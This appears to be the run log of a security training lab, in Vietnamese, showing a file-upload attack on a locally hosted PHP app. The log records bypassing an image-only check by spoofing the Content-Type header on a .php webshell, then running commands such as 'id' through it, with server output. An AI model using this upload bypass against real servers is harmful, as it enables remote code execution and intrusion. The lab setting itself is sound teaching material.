@@ -1,0 +1,18 @@
+# Transcript lab 7.2 - file upload -> RCE (chay that 2026-10-18 17:34)
+# App: php -S 127.0.0.1:8062 -t www | Exploit: bash exploit.sh
+
+=== [0] Thu upload webshell that (Content-Type that = application/x-php) ===
+Chi cho phep anh. Content-Type nhan duoc: application/x-php
+=== [1] Bypass: gia Content-Type thanh image/jpeg (van la file .php) ===
+Tai len thanh cong: /uploads/shell.php
+Content-Type (client khai bao): image/jpeg
+
+=== [2] Goi webshell vua tai: chay lenh 'id' THAT tren server ===
+uid=1000(haipanda) gid=1000(Administrator) groups=1000(Administrator),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker)
+
+=== [3] Chay them vai lenh qua webshell ===
+Linux Haind 6.18.54.1-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Tue Oct  6 19:13:07 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
+haipanda
+Haind
+
+=== DONE ===
